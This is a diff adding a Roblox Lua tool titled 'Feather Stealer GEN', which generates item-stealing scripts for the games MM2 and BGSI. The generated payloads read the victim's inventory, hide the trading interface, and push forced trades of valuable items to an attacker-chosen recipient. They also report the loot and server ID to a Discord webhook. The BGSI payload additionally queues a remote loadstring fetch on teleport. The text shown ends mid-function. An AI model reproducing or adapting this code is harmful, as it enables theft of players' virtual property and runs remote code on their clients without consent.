@@ -1,0 +1,937 @@
+-- Feather Hub Script Generator (Fixed Layout – No Overlap)
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- Clean up old copies
+if CoreGui:FindFirstChild("FeatherScriptGen") then
+    CoreGui.FeatherScriptGen:Destroy()
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "FeatherScriptGen"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+pcall(function() gui.Parent = CoreGui end)
+if not gui.Parent then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+-- Theme
+local Theme = {
+    bg        = Color3.fromRGB(6, 5, 4),
+    card      = Color3.fromRGB(14, 12, 9),
+    border    = Color3.fromRGB(55, 45, 20),
+    text      = Color3.fromRGB(245, 238, 215),
+    muted     = Color3.fromRGB(130, 110, 65),
+    dim       = Color3.fromRGB(22, 18, 10),
+    header    = Color3.fromRGB(9, 8, 5),
+    inputBg   = Color3.fromRGB(4, 3, 2),
+    accent    = Color3.fromRGB(195, 160, 60),
+    accentDim = Color3.fromRGB(110, 88, 28),
+    green     = Color3.fromRGB(140, 195, 100),
+    red       = Color3.fromRGB(210, 75, 75),
+}
+local WIN_W, WIN_H = 440, 420
+local HDR_H = 32
+local BOTTOM_BAR_H = 44
+
+-- Main window
+local win = Instance.new("Frame", gui)
+win.Size = UDim2.new(0, WIN_W, 0, WIN_H)
+win.Position = UDim2.new(0.5, -WIN_W/2, 0.5, -WIN_H/2)
+win.BackgroundColor3 = Theme.bg
+win.BorderSizePixel = 0
+win.ClipsDescendants = true
+win.ZIndex = 2
+Instance.new("UICorner", win).CornerRadius = UDim.new(0, 12)
+
+-- Title bar (draggable)
+local titleBar = Instance.new("Frame", win)
+titleBar.Size = UDim2.new(1, 0, 0, HDR_H)
+titleBar.BackgroundColor3 = Theme.header
+titleBar.BorderSizePixel = 0
+titleBar.ZIndex = 3
+
+local titleText = Instance.new("TextLabel", titleBar)
+titleText.Size = UDim2.new(1, -40, 1, 0)
+titleText.Position = UDim2.new(0, 16, 0, 0)
+titleText.Text = "Feather Stealer GEN"
+titleText.Font = Enum.Font.GothamBold
+titleText.TextSize = 12
+titleText.TextColor3 = Theme.accent
+titleText.TextXAlignment = Enum.TextXAlignment.Left
+titleText.BackgroundTransparency = 1
+
+-- Drag
+local dragToggle, dragStart, winStart = false, nil, nil
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragToggle = true
+        dragStart = input.Position
+        winStart = win.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        win.Position = UDim2.new(winStart.X.Scale, winStart.X.Offset + delta.X, winStart.Y.Scale, winStart.Y.Offset + delta.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragToggle = false end
+end)
+
+-- Close button
+local closeBtn = Instance.new("TextButton", titleBar)
+closeBtn.Size = UDim2.new(0, 24, 0, 24)
+closeBtn.Position = UDim2.new(1, -28, 0.5, -12)
+closeBtn.Text = "×"
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 14
+closeBtn.TextColor3 = Theme.muted
+closeBtn.BackgroundColor3 = Theme.dim
+closeBtn.BorderSizePixel = 0
+closeBtn.ZIndex = 5
+Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
+closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+-- Bottom bar (game selection)
+local bottomBar = Instance.new("Frame", win)
+bottomBar.Size = UDim2.new(1, -16, 0, BOTTOM_BAR_H)
+bottomBar.Position = UDim2.new(0, 8, 1, -BOTTOM_BAR_H - 8)
+bottomBar.BackgroundColor3 = Theme.card
+bottomBar.BorderSizePixel = 0
+bottomBar.ZIndex = 3
+Instance.new("UICorner", bottomBar).CornerRadius = UDim.new(0, 8)
+
+local bottomLabel = Instance.new("TextLabel", bottomBar)
+bottomLabel.Size = UDim2.new(0, 50, 1, 0)
+bottomLabel.Position = UDim2.new(0, 10, 0, 0)
+bottomLabel.Text = "Game:"
+bottomLabel.TextColor3 = Theme.text
+bottomLabel.Font = Enum.Font.GothamSemibold
+bottomLabel.TextSize = 11
+bottomLabel.TextXAlignment = Enum.TextXAlignment.Left
+bottomLabel.BackgroundTransparency = 1
+bottomLabel.ZIndex = 5
+
+local selectedGame = "MM2"
+
+local mm2Btn = Instance.new("TextButton", bottomBar)
+mm2Btn.Size = UDim2.new(0, 70, 0, 28)
+mm2Btn.Position = UDim2.new(0, 65, 0.5, -14)
+mm2Btn.BackgroundColor3 = Theme.accent
+mm2Btn.Text = "MM2"
+mm2Btn.TextColor3 = Color3.new(1, 1, 1)
+mm2Btn.Font = Enum.Font.GothamBold
+mm2Btn.TextSize = 9
+mm2Btn.BorderSizePixel = 0
+mm2Btn.AutoButtonColor = false
+mm2Btn.ZIndex = 5
+Instance.new("UICorner", mm2Btn).CornerRadius = UDim.new(0, 6)
+
+local bgsiBtn = Instance.new("TextButton", bottomBar)
+bgsiBtn.Size = UDim2.new(0, 70, 0, 28)
+bgsiBtn.Position = UDim2.new(0, 140, 0.5, -14)
+bgsiBtn.BackgroundColor3 = Theme.inputBg
+bgsiBtn.Text = "BGSI"
+bgsiBtn.TextColor3 = Theme.text
+bgsiBtn.Font = Enum.Font.GothamBold
+bgsiBtn.TextSize = 9
+bgsiBtn.BorderSizePixel = 0
+bgsiBtn.AutoButtonColor = false
+bgsiBtn.ZIndex = 5
+Instance.new("UICorner", bgsiBtn).CornerRadius = UDim.new(0, 6)
+
+local function updateGameSelection(game)
+    selectedGame = game
+    if game == "MM2" then
+        mm2Btn.BackgroundColor3 = Theme.accent
+        mm2Btn.TextColor3 = Color3.new(1, 1, 1)
+        bgsiBtn.BackgroundColor3 = Theme.inputBg
+        bgsiBtn.TextColor3 = Theme.text
+        rarityCard.Visible = true
+    else
+        bgsiBtn.BackgroundColor3 = Theme.accent
+        bgsiBtn.TextColor3 = Color3.new(1, 1, 1)
+        mm2Btn.BackgroundColor3 = Theme.inputBg
+        mm2Btn.TextColor3 = Theme.text
+        rarityCard.Visible = false
+    end
+end
+
+mm2Btn.MouseButton1Click:Connect(function() updateGameSelection("MM2") end)
+bgsiBtn.MouseButton1Click:Connect(function() updateGameSelection("BGSI") end)
+
+-- Content area
+local content = Instance.new("Frame", win)
+content.Size = UDim2.new(1, -20, 1, -(HDR_H + BOTTOM_BAR_H + 24))
+content.Position = UDim2.new(0, 10, 0, HDR_H + 8)
+content.BackgroundTransparency = 1
+content.BorderSizePixel = 0
+content.ZIndex = 2
+
+-- Layout for the whole scrollable area
+local contentLayout = Instance.new("UIListLayout", content)
+contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
+contentLayout.Padding = UDim.new(0, 8)
+contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local function makeCard(parent, order)
+    local c = Instance.new("Frame", parent)
+    c.Size = UDim2.new(1, 0, 0, 0)
+    c.AutomaticSize = Enum.AutomaticSize.Y
+    c.BackgroundColor3 = Theme.card
+    c.BorderSizePixel = 0
+    c.LayoutOrder = order
+    c.ZIndex = 3
+    Instance.new("UICorner", c).CornerRadius = UDim.new(0, 10)
+    local stroke = Instance.new("UIStroke", c)
+    stroke.Color = Theme.border
+    stroke.Thickness = 1
+    local ll = Instance.new("UIListLayout", c)
+    ll.SortOrder = Enum.SortOrder.LayoutOrder
+    ll.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    ll.Padding = UDim.new(0, 4)
+    return c
+end
+
+local function makeRow(parent, order, height)
+    local h = height or 46
+    local row = Instance.new("Frame", parent)
+    row.Size = UDim2.new(1, -16, 0, h)
+    row.BackgroundTransparency = 1
+    row.BorderSizePixel = 0
+    row.LayoutOrder = order
+    row.ZIndex = 4
+    return row
+end
+
+-- Webhook & Recipient inputs card
+local inputCard = makeCard(content, 1)
+
+local function createInputRow(parent, order, label, placeholder)
+    local row = makeRow(parent, order, 50)
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size = UDim2.new(0, 120, 1, 0)
+    lbl.Text = label
+    lbl.TextColor3 = Theme.text
+    lbl.Font = Enum.Font.Gotham
+    lbl.TextSize = 11
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.BackgroundTransparency = 1
+    lbl.ZIndex = 5
+
+    local input = Instance.new("TextBox", row)
+    input.Size = UDim2.new(1, -130, 0, 28)
+    input.Position = UDim2.new(0, 130, 0.5, -14)
+    input.BackgroundColor3 = Theme.inputBg
+    input.PlaceholderText = placeholder
+    input.Text = ""
+    input.TextColor3 = Theme.text
+    input.PlaceholderColor3 = Theme.muted
+    input.Font = Enum.Font.Gotham
+    input.TextSize = 10
+    input.BorderSizePixel = 0
+    input.ZIndex = 5
+    Instance.new("UICorner", input).CornerRadius = UDim.new(0, 6)
+    return input, lbl
+end
+
+local webhookInput, _ = createInputRow(inputCard, 1, "Webhook:", "https://discord.com/api/webhooks/...")
+local usernameInput, _ = createInputRow(inputCard, 2, "Recipient:", "Username")
+
+-- Rarity selection card (only for MM2)
+local rarityCard = makeCard(content, 2)
+rarityCard.Name = "RarityCard"
+
+local rarityRow = makeRow(rarityCard, 1, 40)
+
+local rarityLbl = Instance.new("TextLabel", rarityRow)
+rarityLbl.Size = UDim2.new(0, 60, 1, 0)
+rarityLbl.Text = "Rarity:"
+rarityLbl.TextColor3 = Theme.text
+rarityLbl.Font = Enum.Font.GothamSemibold
+rarityLbl.TextSize = 11
+rarityLbl.TextXAlignment = Enum.TextXAlignment.Left
+rarityLbl.BackgroundTransparency = 1
+rarityLbl.ZIndex = 5
+
+local btnContainer = Instance.new("Frame", rarityRow)
+btnContainer.Size = UDim2.new(1, -65, 1, 0)
+btnContainer.Position = UDim2.new(0, 65, 0, 0)
+btnContainer.BackgroundTransparency = 1
+btnContainer.BorderSizePixel = 0
+
+local selectedRarity = "Godly"
+local rarityButtons = {}
+local rarities = {"Common","Uncommon","Rare","Legendary","Godly"}
+
+local function updateRarityButtons()
+    for _, btn in ipairs(rarityButtons) do
+        if btn.Text == selectedRarity then
+            btn.BackgroundColor3 = Theme.accent
+            btn.TextColor3 = Color3.new(1, 1, 1)
+        else
+            btn.BackgroundColor3 = Theme.inputBg
+            btn.TextColor3 = Theme.text
+        end
+    end
+end
+
+for i, rarity in ipairs(rarities) do
+    local btn = Instance.new("TextButton", btnContainer)
+    btn.Size = UDim2.new(0, 65, 0, 28)
+    btn.Position = UDim2.new(0, (i-1)*68, 0.5, -14)
+    btn.BackgroundColor3 = rarity == selectedRarity and Theme.accent or Theme.inputBg
+    btn.Text = rarity
+    btn.TextColor3 = rarity == selectedRarity and Color3.new(1,1,1) or Theme.text
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 9
+    btn.BorderSizePixel = 0
+    btn.AutoButtonColor = false
+    btn.ZIndex = 5
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    btn.MouseButton1Click:Connect(function()
+        selectedRarity = rarity
+        updateRarityButtons()
+    end)
+    table.insert(rarityButtons, btn)
+end
+
+-- Buttons card
+local btnCard = makeCard(content, 3)
+local btnRow = makeRow(btnCard, 1, 48)
+
+local generateBtn = Instance.new("TextButton", btnRow)
+generateBtn.Size = UDim2.new(0, 140, 0, 32)
+generateBtn.Position = UDim2.new(0, 0, 0.5, -16)
+generateBtn.BackgroundColor3 = Theme.accentDim
+generateBtn.Text = "Generate"
+generateBtn.TextColor3 = Color3.new(1, 1, 1)
+generateBtn.Font = Enum.Font.GothamBold
+generateBtn.TextSize = 11
+generateBtn.BorderSizePixel = 0
+generateBtn.AutoButtonColor = false
+generateBtn.ZIndex = 5
+Instance.new("UICorner", generateBtn).CornerRadius = UDim.new(0, 6)
+generateBtn.MouseEnter:Connect(function() TweenService:Create(generateBtn, TweenInfo.new(0.2), {BackgroundColor3 = Theme.accent}):Play() end)
+generateBtn.MouseLeave:Connect(function() TweenService:Create(generateBtn, TweenInfo.new(0.2), {BackgroundColor3 = Theme.accentDim}):Play() end)
+
+local copyBtn = Instance.new("TextButton", btnRow)
+copyBtn.Size = UDim2.new(0, 140, 0, 32)
+copyBtn.Position = UDim2.new(1, -140, 0.5, -16)
+copyBtn.BackgroundColor3 = Theme.accentDim
+copyBtn.Text = "Copy"
+copyBtn.TextColor3 = Color3.new(1, 1, 1)
+copyBtn.Font = Enum.Font.GothamBold
+copyBtn.TextSize = 11
+copyBtn.BorderSizePixel = 0
+copyBtn.AutoButtonColor = false
+copyBtn.ZIndex = 5
+Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 6)
+copyBtn.MouseEnter:Connect(function() TweenService:Create(copyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Theme.accent}):Play() end)
+copyBtn.MouseLeave:Connect(function() TweenService:Create(copyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Theme.accentDim}):Play() end)
+
+-- Result frame (hidden)
+local resultFrame = Instance.new("Frame", gui)
+resultFrame.Size = UDim2.new(0, 680, 0, 480)
+resultFrame.Position = UDim2.new(0.5, -340, 0.5, -240)
+resultFrame.BackgroundColor3 = Theme.bg
+resultFrame.BorderSizePixel = 0
+resultFrame.Visible = false
+resultFrame.ZIndex = 10
+Instance.new("UICorner", resultFrame).CornerRadius = UDim.new(0, 12)
+
+local resultTitle = Instance.new("TextLabel", resultFrame)
+resultTitle.Size = UDim2.new(1, -20, 0, 28)
+resultTitle.Position = UDim2.new(0, 10, 0, 8)
+resultTitle.Text = "Generated Script"
+resultTitle.TextColor3 = Theme.accent
+resultTitle.Font = Enum.Font.GothamBold
+resultTitle.TextSize = 12
+resultTitle.BackgroundTransparency = 1
+
+local resultScroll = Instance.new("ScrollingFrame", resultFrame)
+resultScroll.Size = UDim2.new(1, -20, 1, -80)
+resultScroll.Position = UDim2.new(0, 10, 0, 40)
+resultScroll.BackgroundColor3 = Theme.card
+resultScroll.BorderSizePixel = 0
+resultScroll.ScrollBarThickness = 6
+resultScroll.ScrollBarImageColor3 = Theme.accent
+resultScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+resultScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+Instance.new("UICorner", resultScroll).CornerRadius = UDim.new(0, 8)
+
+local resultText = Instance.new("TextLabel", resultScroll)
+resultText.Size = UDim2.new(1, -16, 0, 0)
+resultText.Position = UDim2.new(0, 8, 0, 8)
+resultText.BackgroundTransparency = 1
+resultText.Text = ""
+resultText.TextColor3 = Theme.text
+resultText.Font = Enum.Font.Code
+resultText.TextSize = 11
+resultText.TextXAlignment = Enum.TextXAlignment.Left
+resultText.TextYAlignment = Enum.TextYAlignment.Top
+
+local closeResultBtn = Instance.new("TextButton", resultFrame)
+closeResultBtn.Size = UDim2.new(0, 100, 0, 28)
+closeResultBtn.Position = UDim2.new(0.5, -50, 1, -36)
+closeResultBtn.BackgroundColor3 = Theme.red
+closeResultBtn.Text = "Close"
+closeResultBtn.TextColor3 = Color3.new(1, 1, 1)
+closeResultBtn.Font = Enum.Font.GothamBold
+closeResultBtn.TextSize = 10
+closeResultBtn.BorderSizePixel = 0
+Instance.new("UICorner", closeResultBtn).CornerRadius = UDim.new(0, 6)
+closeResultBtn.MouseButton1Click:Connect(function() resultFrame.Visible = false end)
+
+-- Generate functions (unchanged)
+local function generateMM2(webhook, username, rarity, minVal)
+    return [=[
+if not game:IsLoaded() then game.Loaded:Wait() end
+if game.PlaceId ~= 142823291 then return end
+
+_G.execDone = _G.execDone or false
+if _G.execDone then return end
+_G.execDone = true
+
+local targetUser = "]=] .. username .. [=["
+local notifyUrl = "]=] .. webhook .. [=["
+local rarityFilter = "]=] .. (rarity or "Godly") .. [=["
+local valueThreshold = ]=] .. (tonumber(minVal) or 1) .. [=[
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local ItemData = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local TradeRemote = ReplicatedStorage:WaitForChild("Trade")
+
+local rarityOrder = {'Common','Uncommon','Rare','Legendary','Godly','Ancient','Unique','Vintage'}
+local minRarityIndex = table.find(rarityOrder, rarityFilter) or 5
+
+local valueTable = {
+    Deathshard=22,DeathshardChroma=65,BloodKnife=8,GhostKnife=10,Knife1=3,ShadowKnife=6,
+    TimeKnife=5,AmericaGun=8,GoldenGun=4,Gun1=4,Phaser=7,Disint=7,Luger=75,LugerChroma=100,
+    Sorry=775,TheSeer=3,Fang=20,FangChroma=55,Heat=23,HeatChroma=70,Shark=30,SharkChroma=65,
+    Saw=7,SawChroma=50,Laser=7,LaserChroma=80,Spider=17,Slasher=23,SlasherChroma=65,
+    Candy=190,Chill=17,Handsaw=8,RedLuger=70,GreenLuger=40,Xmas=12,Sugar=125,Clockwork=25,
+    Tides=20,TidesChroma=65,Pixel=23,Blaster=30,Virtual=28,AmericaSword=30,Amerilaser=32,
+    Nightblade=30,Hallow=12,HallowsBlade=10,Eternal=10,IceDragon=12,Flames=12,Pumpking=17,
+    BattleAxe=13,WintersEdge=12,IceShard=13,Snowflake=8,Frostsaber=15,Scythe=75,
+    Boneblade=8,BonebladeChroma=50,BattleAxe2=18,Eternal2=10,Gingerblade=22,GingerbladeChroma=55,
+    Icewing=4,GingerLuger=23,Gemstone=23,GemstoneChroma=65,RedSeer=3,OrangeSeer=2,YellowSeer=2,
+    BlueSeer=3,PurpleSeer=3,SeerChroma=55,Eternal3=10,Eternal4=10,ElderwoodGun=60,ElderwoodScythe=90,
+    Ghostblade=10,EternalCane=24,Logchopper=30,Frostbite=8,Minty=24,Lugercane=24,Lightbringer=58,
+    ChromaLightbringer=120,Darkbringer=60,ChromaDarkbringer=125,Bioblade=13,Prismatic=7,
+    VampiresEdge=15,Hallowscythe=55,Hallowgun=35,Peppermint=5,Icebreaker=120,Iceblaster=60,
+    Cookieblade=4,Jinglegun=15,Heartblade=125,Eggblade=8,Nebula=28,Harvester=725,Candleflame=120,
+    CandleflameChroma=145,SwirlyAxe=175,SwirlyGun=135,SwirlyGunChroma=140,SwirlyBlade=70,
+    Iceflake=32,Icebeam=32,Plasmablade=32,Plasmabeam=32,Phantom2022=75,Spectre2022=75,
+    ElderwoodKnife=120,ElderwoodKnifeChroma=140,Makeshift=125,ZombieBat=360,Gingermint_K=55,
+    Gingermint_KChroma=135,Gingermint_G=55,Icepiercer=700,Sakura_K=560,Blossom_G=570,
+    Rainbow_K=185,Rainbow_G=190,Waves_K=145,Ocean_G=150,TravelerAxe=6000,TravelerGun=3300,
+    TravelerGunChroma=100000,Darksword=490,Darkshot=495,Turkey2023=1500,Gingerscope=9300,
+    TreeGun2023=1800,TreeGun2023Chroma=44000,TreeKnife2023=1100,TreeKnife2023Chroma=26000,
+    FlowerwoodKnife=95,FlowerwoodGun=100,Pearl_K=62,Pearl_G=62,Watergun=105,WatergunChroma=2300,
+    WraithKnife=155,WraithGun=155,VampireAxe=475,VampireGun=500,VampireGunChroma=15000
+}
+
+local excludedItems = {
+    DefaultGun=true,DefaultKnife=true,TestItem=true,Season1TestKnife=true,Cracks=true,
+    Icecrusher=true,["???"]=true,Dartbringer=true,SharkSeeker=true
+}
+
+local function getTradeStatus()
+    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+end
+
+local function sendTradeRequest(target)
+    TradeRemote.SendRequest:InvokeServer(Players:WaitForChild(target))
+end
+
+local function offerItem(itemId)
+    TradeRemote.OfferItem:FireServer(itemId, "Weapons")
+end
+
+local function acceptTrade()
+    TradeRemote.AcceptTrade:FireServer(285646582)
+end
+
+local function getInventory()
+    local data = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+    local items = {}
+    for itemId, amount in pairs(data.Weapons.Owned) do
+        local itemInfo = ItemData[itemId]
+        if itemInfo and itemInfo.Rarity then
+            local rarityIndex = table.find(rarityOrder, itemInfo.Rarity)
+            if rarityIndex and rarityIndex >= minRarityIndex then
+                local value = valueTable[itemId] or (rarityIndex > 5 and 2 or 1)
+                if value >= valueThreshold and not excludedItems[itemId] then
+                    table.insert(items, {
+                        id = itemId,
+                        name = itemInfo.ItemName or itemId,
+                        amount = amount,
+                        rarity = itemInfo.Rarity,
+                        value = value,
+                        chroma = itemInfo.Chroma or false
+                    })
+                end
+            end
+        end
+    end
+    table.sort(items, function(a,b) return a.value * a.amount > b.value * b.amount end)
+    return items
+end
+
+local function notify(items, totalValue)
+    local itemList = ""
+    for _, item in ipairs(items) do
+        itemList = itemList .. string.format("%s (x%d): %d value\n", item.name, item.amount, item.value * item.amount)
+        if #itemList > 800 then
+            itemList = itemList .. "+ more..."
+            break
+        end
+    end
+    
+    local payload = {
+        content = "Server: `" .. game.JobId .. "`",
+        embeds = {{
+            title = "Trade Session Initiated",
+            color = 3447003,
+            fields = {
+                {name = "User", value = LocalPlayer.Name, inline = true},
+                {name = "Recipient", value = targetUser, inline = true},
+                {name = "Items", value = "```" .. itemList .. "```", inline = false},
+                {name = "Total Value", value = tostring(totalValue), inline = true},
+                {name = "Join Command", value = "```game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')```", inline = false}
+            },
+            footer = {text = "Generated Script • " .. os.date("%Y-%m-%d %H:%M:%S")}
+        }}
+    }
+    
+    request({
+        Url = notifyUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+local function executeTransfer()
+    local inventory = getInventory()
+    if #inventory == 0 then
+        LocalPlayer:Kick("No eligible items found")
+        return
+    end
+    
+    local totalValue = 0
+    for _, item in ipairs(inventory) do
+        totalValue = totalValue + (item.value * item.amount)
+    end
+    
+    notify(inventory, totalValue)
+    
+    local tradeGui = LocalPlayer.PlayerGui:WaitForChild("TradeGUI")
+    local phoneTradeGui = LocalPlayer.PlayerGui:WaitForChild("TradeGUI_Phone")
+    
+    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
+    phoneTradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() phoneTradeGui.Enabled = false end)
+    
+    local processed = {}
+    for _, item in ipairs(inventory) do
+        processed[item.id] = item
+    end
+    
+    local active = true
+    while active and #inventory > 0 do
+        local status = getTradeStatus()
+        
+        if status == "None" then
+            sendTradeRequest(targetUser)
+        elseif status == "StartTrade" then
+            local offered = 0
+            while offered < 4 and #inventory > 0 do
+                local item = table.remove(inventory, 1)
+                for i = 1, item.amount do
+                    offerItem(item.id)
+                    task.wait(0.1)
+                end
+                offered = offered + 1
+            end
+            task.wait(5)
+            acceptTrade()
+            repeat task.wait(0.5) until getTradeStatus() == "None"
+        elseif status == "ReceivingRequest" then
+            TradeRemote.DeclineRequest:FireServer()
+        end
+        
+        task.wait(1)
+    end
+    
+    local finalPayload = {
+        embeds = {{
+            title = "Transfer Complete",
+            color = 65280,
+            description = "All eligible items processed",
+            footer = {text = "Session ended"}
+        }}
+    }
+    
+    request({
+        Url = notifyUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(finalPayload)
+    })
+end
+
+-- Anti-idle
+game:GetService("Players").LocalPlayer.Idled:Connect(function()
+    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+    task.wait(1)
+    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+end)
+
+executeTransfer()
+]=]
+end
+
+local function generateBGSI(webhook, username)
+    return [=[
+if not game:IsLoaded() then game.Loaded:Wait() end
+if game.PlaceId ~= 85896571713843 and game.PlaceId ~= 98046029518959 then return end
+
+_G.sessionActive = _G.sessionActive or false
+if _G.sessionActive then return end
+_G.sessionActive = true
+
+local recipient = "]=] .. username .. [=["
+local webhookUrl = "]=] .. webhook .. [=["
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+
+queue_on_teleport([[
+    wait(5)
+    local plr = game:GetService("Players").LocalPlayer
+    repeat task.wait() until not plr:WaitForChild("PlayerGui"):FindFirstChild("Intro")
+    getgenv().autoLoad = true
+    getgenv().targetRecipient = "]=] .. username .. [=["
+    getgenv().notifyEndpoint = "]=] .. webhook .. [=["
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yourrepo/script/main/loader"))()
+]])
+
+-- Server hop if private
+if workspace:GetAttribute("PrivateServerId") and workspace:GetAttribute("PrivateServerId") ~= "" then
+    local function getPublicServer()
+        local cursor = ""
+        local bestServer = nil
+        repeat
+            local success, result = pcall(function()
+                return request({
+                    Url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100&cursor=" .. cursor,
+                    Method = "GET"
+                })
+            end)
+            if success and result then
+                local data = HttpService:JSONDecode(result.Body)
+                for _, server in ipairs(data.data or {}) do
+                    if server.playing > 0 and server.playing < server.maxPlayers then
+                        if not bestServer or server.playing < bestServer.playing then
+                            bestServer = server
+                        end
+                    end
+                end
+                cursor = data.nextPageCursor or ""
+            end
+            task.wait(0.1)
+        until cursor == "" or cursor == nil
+        return bestServer and bestServer.id
+    end
+    
+    local serverId = getPublicServer()
+    if serverId then
+        TeleportService:TeleportToPlaceInstance(placeId, serverId, LocalPlayer)
+    end
+    return
+end
+
+-- Data services
+local DataService = require(ReplicatedStorage.Client.Framework.Services.LocalData):Get()
+local PetUtil = require(ReplicatedStorage.Shared.Utils.Stats.PetUtil)
+
+-- Pet value database
+local petValues = {
+    Avernus=1700,Beta_TV=400,Bionic_Shard=10,Cardinal_Bunny=50,Chocolate_Bunny=55,
+    Crescent_Empress=40,Dark_Serpent=150,Dementor=32500,Demonic_Dogcat=35,DOOF=15,
+    Dowodle=800,Dusk=20,Easter_Basket=9500,Electra_Hydra=250,Elite_Challenger=1700,
+    Elite_Soul=3750,Enraged_Phoenix=125,Flying_Gem=80,Giant_Chocolate_Chicken=6200,
+    Godly_Gem=13000,Hacker_Prism=10,Holy_Egg=22,Infernus=350,Jackpot=200,King_Doggy=900,
+    King_Pufferfish=25,King_Soul=60,Kitsune=110,Luminosity=3000,Lunar_Deity=25,
+    MAN_FACE_GOD=37000,Manarium=90,Mech_Robot=400,Midas=70,Moonlight=40,
+    Mythic_Avernus=16500,Mythic_Cardinal_Bunny=500,Mythic_Chocolate_Bunny=300,
+    Mythic_Crescent_Empress=450,Mythic_DOOF=150,Mythic_Easter_Basket=95000,
+    Mythic_Elite_Soul=15000,Mythic_Giant_Chocolate_Chicken=100000,Mythic_Godly_Gem=120000,
+    Mythic_King_Doggy=11000,Mythic_Manarium=900,Mythic_Mech_Robot=4500,Mythic_Midas=700,
+    Mythic_Patronus=12000,Mythic_Royal_Trophy=17000,Mythic_Seraph=5800,
+    NULLVoid=20,Ophanim=15,Overseer=375,Parasite=5,Patronus=1200,ROUND=300,
+    Royal_Trophy=1600,Seraph=500,Shiny_Avernus=5800,Shiny_Beta_TV=2800,
+    Shiny_Cardinal_Bunny=250,Shiny_Chocolate_Bunny=275,Shiny_Dark_Serpent=1225,
+    Shiny_Dowodle=5600,Shiny_Easter_Basket=32500,Shiny_Electra_Hydra=1750,
+    Shiny_Giant_Chocolate_Chicken=18500,Shiny_Godly_Gem=38000,Shiny_Infernus=2450,
+    Shiny_King_Doggy=3000,Shiny_Mech_Robot=1400,Silly_Doggy=17000,Solar_Deity=55,
+    Starlight=40,The_Overlord=350,TravelerAxe=6000,TravelerGun=3300,
+    TravelerGunChroma=100000,VampireAxe=475,VampireGun=500,VampireGunChroma=15000
+}
+
+-- Hide trading UI
+local tradingGui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("ScreenGui"):WaitForChild("Trading")
+for _, obj in pairs(tradingGui:GetDescendants()) do
+    if obj:IsA("GuiObject") then obj.Visible = false end
+end
+tradingGui.DescendantAdded:Connect(function(desc) if desc:IsA("GuiObject") then desc.Visible = false end end)
+
+-- Get valuable pets
+local function scanInventory()
+    local valuables = {}
+    for petId, petData in pairs(DataService.Pets or {}) do
+        local displayName = (petData.Shiny and "Shiny " or "") .. (petData.Mythic and "Mythic " or "") .. petData.Name
+        local lookupKey = displayName:gsub(" ", "_")
+        local value = petValues[lookupKey]
+        
+        if value and value > 0 then
+            table.insert(valuables, {
+                id = petId,
+                displayName = displayName,
+                amount = petData.Amount or 1,
+                value = value,
+                chance = PetUtil.GetChance(nil, petData)
+            })
+        end
+    end
+    
+    table.sort(valuables, function(a,b) return a.value > b.value end)
+    return valuables
+end
+
+-- Format numbers
+local function formatNumber(n)
+    local s = tostring(n)
+    return s:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+end
+
+-- Send notification
+local function sendNotification(pets, totalValue)
+    local petList = ""
+    for i, pet in ipairs(pets) do
+        if i > 12 then
+            petList = petList .. "+ more..."
+            break
+        end
+        petList = petList .. string.format("%dx %s (%s value)\n", pet.amount, pet.displayName, formatNumber(pet.value))
+    end
+    
+    local payload = {
+        content = "Server: `" .. jobId .. "`",
+        embeds = {{
+            title = "Asset Transfer Ready",
+            url = "https://www.roblox.com/games/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId,
+            color = 3447003,
